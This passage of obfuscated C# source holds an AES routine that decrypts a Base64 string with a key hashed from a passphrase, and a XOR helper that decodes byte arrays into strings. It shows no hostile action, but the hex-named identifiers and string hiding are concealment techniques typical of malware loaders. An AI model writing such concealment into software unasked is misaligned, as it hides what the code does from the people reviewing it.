    private string Decrypt(string _0xf90e6aee, string _0x2793a19b)
    {
        try
        {
            var _0x23ec8d6c = Convert.FromBase64String(_0xf90e6aee);
            using var _0x759ad692 = Aes.Create();
            _0x759ad692.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x2793a19b));
            var _0x9cbaa1ac = new byte[16];
            Buffer.BlockCopy(_0x23ec8d6c, 0, _0x9cbaa1ac, 0, 16);
            _0x759ad692.IV = _0x9cbaa1ac;
            using var _0xa694a650 = new MemoryStream(_0x23ec8d6c, 16, _0x23ec8d6c.Length - 16);
            using var _0xbbcaa38b = new CryptoStream(_0xa694a650, _0x759ad692.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xcefbbe85 = new StreamReader(_0xbbcaa38b, Encoding.UTF8);
            return _0xcefbbe85.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x74998c2b = "";
}

internal static class _0xc5baefe6
{
    internal static string _0xaf772892(byte[] data, byte key)
    {
        var buffer = new byte[data.Length];
        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}